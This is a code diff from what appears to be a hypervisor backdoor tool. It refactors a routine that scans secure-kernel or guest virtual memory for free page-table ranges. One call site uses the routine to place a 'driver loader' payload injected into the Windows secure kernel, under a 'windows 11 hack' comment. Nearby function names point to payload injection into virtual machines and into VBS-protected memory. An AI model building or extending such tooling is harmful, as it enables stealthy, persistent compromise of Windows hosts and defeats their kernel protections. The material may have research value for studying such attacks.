@@ -157,6 +157,76 @@ bool ept_is_guest(uint64_t ept_addr)
     return phys_addr != 0;
 }
 //--------------------------------------------------------------------------------------
+uint64_t backdoor_find_free_pte(uint64_t pml4_addr, uint64_t ept_addr, uint64_t addr_start, uint64_t addr_end, uint32_t size)
+{
+    uint64_t addr = 0, found_addr = 0, found_num = 0;
+
+    printf("[+] Scanning virtual memory from 0x%llx to 0x%llx\n", addr_start, addr_end);
+
+    for (addr = addr_start; addr < addr_end; addr += PAGE_SIZE)
+    {
+        uint64_t pte_addr = 0, pte = 0;
+        HVBD_PTE_SIZE pte_size;
+
+        m_quiet = true;
+
+        // get physical address of the page table entry
+        if (backdoor_pte_addr(addr, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
+        {
+            found_num = found_addr = 0;
+
+            m_quiet = false;
+
+            // unable to get PTE address
+            continue;
+        }
+
+        m_quiet = false;
+
+        if (pte_size != HVBD_PTE_SIZE_4K)
+        {
+            found_num = found_addr = 0;
+
+            // unexpected page size
+            continue;
+        }
+
+        // read page table entry contents
+        if (backdoor_phys_read_64(pte_addr, &pte) != 0)
+        {
+            found_num = found_addr = 0;
+
+            // physical memory read error
+            continue;
+        }
+
+        if (pte != 0)
+        {
+            found_num = found_addr = 0;
+
+            // unexpected PTE
+            continue;
+        }
+
+        if (found_num == 0)
+        {
+            // remember first occurrence
+            found_addr = addr;
+        }
+
+        // free PTE found
+        found_num += 1;
+
+        if (found_num == size / PAGE_SIZE)
+        {
+            // desired free memory range was found
+            return found_addr;
+        }
+    }
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
 int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
 {
     int ret = -1;
@@ -1967,80 +2037,6 @@ int backdoor_sk_trigger(void)
     return -1;
 }
 
-uint64_t backdoor_sk_find_mem(uint64_t pml4_addr, uint64_t ept_addr, uint64_t addr_start, uint64_t addr_end, uint32_t size)
-{
-    uint64_t addr = 0, found_addr = 0, found_num = 0;
-
-    printf("[+] Scanning virtual memory from 0x%llx to 0x%llx\n", addr_start, addr_end);
-
-    for (addr = addr_start; addr < addr_end; addr += PAGE_SIZE)
-    {
-        uint64_t pte_addr = 0, pte = 0;
-        HVBD_PTE_SIZE pte_size;
-
-        m_quiet = true;
-
-        // get physical address of the page table entry
-        if (backdoor_pte_addr(addr, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
-        {
-            found_num = 0;
-            found_addr = 0;
-
-            m_quiet = false;
-
-            // unable to get PTE address
-            continue;
-        }
-
-        m_quiet = false;
-
-        if (pte_size != HVBD_PTE_SIZE_4K)
-        {
-            found_num = 0;
-            found_addr = 0;
-
-            // unexpected page size
-            continue;
-        }
-
-        // read page table entry contents
-        if (backdoor_phys_read_64(pte_addr, &pte) != 0)
-        {
-            found_num = 0;
-            found_addr = 0;
-
-            // physical memory read error
-            continue;
-        }
-
-        if (pte != 0)
-        {
-            found_num = 0;
-            found_addr = 0;
-
-            // unexpected PTE
-            continue;
-        }
-
-        if (found_num == 0)
-        {
-            // remember first occurrence
-            found_addr = addr;
-        }
-
-        // free PTE found
-        found_num += 1;
-
-        if (found_num == size / PAGE_SIZE)
-        {
-            // desired free memory range was found
-            return found_addr;
-        }
-    }
-
-    return 0;
-}
-
 int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
 {
     int ret = -1;
@@ -2320,10 +2316,11 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
         }
     }
 
+    // windows 11 hack
     if (!driver_base_free)
     {
-        // scan seccure kernel virtual memory for the free PTE range
-        if ((driver_base_virt = backdoor_sk_find_mem(
+        // scan secure kernel virtual memory for the free PTE range
+        if ((driver_base_virt = backdoor_find_free_pte(
             pml4_addr, ept_addr, sk_addr_virt & SK_MEM_SCAN_MASK, SK_MEM_SCAN_LIMIT, loader_mem_size)) == 0)
         {
             printf("ERROR: Unable to locate vitual address for the driver loader\n");
